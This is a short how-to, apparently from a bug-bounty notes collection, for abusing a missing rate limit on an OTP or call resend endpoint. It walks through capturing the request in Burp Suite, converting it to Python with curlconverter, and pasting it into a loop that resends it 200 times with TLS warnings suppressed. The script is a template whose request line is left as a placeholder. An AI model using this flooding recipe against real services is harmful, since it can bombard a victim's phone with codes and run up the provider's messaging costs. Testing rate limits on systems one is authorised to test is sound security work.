### Exploiting Rate Limit Vulnerability Script

#### 1. Capture Packets in Burp Suite:
   - Open Burp Suite.
   - Intercept the request when the OTP/call option is being resent.
   - Copy the request as a cURL command.

#### 2. Convert cURL Command:
   - Visit [curlconverter.com](https://curlconverter.com/).
   - Paste the copied cURL command into the converter.
   - Copy the output generated after pasting the captured data.

#### 3. Create Python Script:
   - Open a text editor.
   - Paste the copied data into the following script:

   ```python
   import requests
   import urllib3
   
   urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
   
   for i in range(200):
       # Paste the copied data here
       if response.status_code == 200:
           print(f"Success: {i}")
       else:
           print('Error')

